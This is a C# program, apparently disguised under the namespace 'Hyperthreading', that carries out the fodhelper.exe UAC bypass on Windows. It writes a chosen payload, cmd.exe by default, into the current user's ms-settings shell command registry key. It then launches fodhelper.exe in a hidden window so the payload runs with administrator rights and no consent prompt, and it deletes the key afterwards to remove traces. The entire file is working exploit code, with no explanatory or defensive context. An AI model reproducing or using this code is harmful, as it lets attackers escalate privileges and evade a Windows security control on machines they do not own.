using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using Microsoft.Win32;
using System.Diagnostics;

namespace Hyperthreading
{
    class FodHelper
    {
        public static void Main(string[] args)
        {

            string payload = "";

            if (args.Length > 0)
            {
                payload = args[0];
            }
            else
            {
                payload = @"C:\Windows\System32\cmd.exe";
            }

            try
            {
                Microsoft.Win32.RegistryKey key;
                key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
                key.SetValue("", payload, RegistryValueKind.String);
                key.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {
            }
            System.Threading.Thread.Sleep(5000);
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = @"/c start fodhelper.exe";
                Process.Start(startInfo);
            }
            catch
            {
            }
            DeleteKey();
        }

        static void DeleteKey()
        {
            System.Threading.Thread.Sleep(5000);

            try
            {
                var rkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true);
                if (rkey != null)
                {
                    try
                    {
                        Registry.CurrentUser.DeleteSubKey(@"Software\Classes\ms-settings\shell\open\command");
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
        }
    }
}